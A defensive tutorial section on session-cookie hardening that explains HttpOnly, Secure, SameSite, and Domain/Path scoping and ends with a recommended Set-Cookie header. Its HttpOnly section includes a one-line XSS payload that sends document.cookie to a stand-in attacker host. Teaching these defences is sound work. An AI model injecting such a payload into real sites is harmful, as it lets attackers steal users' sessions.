This section of the outline, **002-B-Cookie-Security-Hardening**, addresses how to secure the "keys to the castle" (the Session ID).

In a stateful authentication system, once a user logs in, the server gives them a **Session Cookie**. If a hacker steals this cookie, they **become** the user. They don't need the username or password; the cookie allows them to hijack the active session.

Here is a detailed breakdown of the four pillars of cookie security:

---

### 1. `HttpOnly` flag
**The Shield against XSS (Cross-Site Scripting).**

*   **The Threat:**
    If your website has an XSS vulnerability (e.g., a hacker manages to inject a malicious JavaScript script into your page), that script can execute access commands. By default, JavaScript can read cookies using `document.cookie`.
    *   *Scenario:* A hacker injects a script: `<script>fetch('http://hacker.com?cookie=' + document.cookie)</script>`. They now have your user's Session ID.
*   **The Defense (`HttpOnly`):**
    When the server sets the cookie, it adds the `HttpOnly` flag. This tells the browser: **"This cookie is for the server only. Do not let client-side JavaScript access it."**
*   **Result:**
    Even if an attacker successfully runs malicious JavaScript on your site, `document.cookie` will return an empty string (or everything except the HttpOnly cookie). The attacker cannot steal the session via XSS.

### 2. `Secure` flag
**The Shield against MitM (Man-in-the-Middle) Attacks.**

*   **The Threat:**
    Cookies are just text headers. If a user is on an unsecured Wi-Fi network (like a coffee shop) and sends a request over standard HTTP (not HTTPS), the traffic is sent in "plaintext." A hacker sniffing the Wi-Fi traffic can read the request headers and copy the cookie.
*   **The Defense (`Secure`):**
    This flag tells the browser: **"Only send this cookie back to the server if the connection is encrypted (HTTPS)."**
*   **Result:**
    If the user accidentally types `http://your-bank.com` instead of `https://`, the browser will **refuse** to send the session cookie. This prevents the cookie from ever traveling over the wire in plaintext.

### 3. `SameSite` attribute
**The Shield against CSRF (Cross-Site Request Forgery).**

*   **The Threat:**
    You are logged into `bank.com`. Without logging out, you click a link in a phishing email that takes you to `evil.com`. The code on `evil.com` creates a hidden form that makes a POST request to `bank.com/transfer-money`.
    Historically, browsers would see that request going to `bank.com` and helpfully attach your `bank.com` cookies (because you are logged in). The bank executes the transfer because the cookie is valid.
*   **The Defense (`SameSite`):**
    This attribute controls whether cookies are sent with cross-site requests (requests initiated from a different domain).
    *   **`SameSite=Lax` (Default/Recommended):** The cookie is **not** sent on sub-requests (like images or frames) or POSTs from other sites. It *is* sent if the user clicks a standard link (top-level navigation) to your site. This balances security with user experience.
    *   **`SameSite=Strict`:** The cookie is **never** sent if the request comes from a different site.
        *   *Downside:* If you are logged into GitHub, and someone sends you a link to a GitHub repo, clicking it will treat you as logged out initially because the cookie strictly refused to travel from Gmail to GitHub.
    *   **`SameSite=None`:** The cookie is always sent. (This is dangerous and requires the `Secure` flag).

### 4. `Domain` and `Path` Scoping
**Minimizing the Attack Surface.**

*   **The Concept:**
    You want to restrict where the cookie is valid so that other subdomains or applications cannot access it.
*   **`Domain`:**
    *   If you set `Domain=example.com`, the cookie is readable by `example.com` AND `api.example.com` AND `blog.example.com`.
    *   **Best Practice:** Usually, you should **omit** the Domain attribute. If omitted, the browser allows the cookie *only* on the exact host that set it (e.g., `api.example.com` cannot be read by `blog.example.com`).
*   **`Path`:**
    *   Defines the URL path that must exist in the requested URL for the cookie to be sent.
    *   Usually set to `Path=/` so the user stays logged in across the whole app. However, if you have two apps on the same domain (`/app1` and `/app2`), you can scope cookies specifically to those paths to prevent them from reading each other's sessions.

---

### Summary: The "Perfect" Set-Cookie Header

If you are building a secure backend, your HTTP response header for logging a user in should look like this:

```http
Set-Cookie: session_id=xyz123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600;
```

**Translation:**
1.  **`session_id=xyz123`**: The data.
2.  **`HttpOnly`**: "Browser, do not let JavaScript read this." (Stops XSS theft).
3.  **`Secure`**: "Browser, do not send this over HTTP, only HTTPS." (Stops sniffing).
4.  **`SameSite=Lax`**: "Browser, do not send this if another website tries to POST data to us." (Stops CSRF).
5.  **`Path=/`**: "Valid for all pages on the site."
6.  **`Max-Age`**: "Delete this cookie after 1 hour."
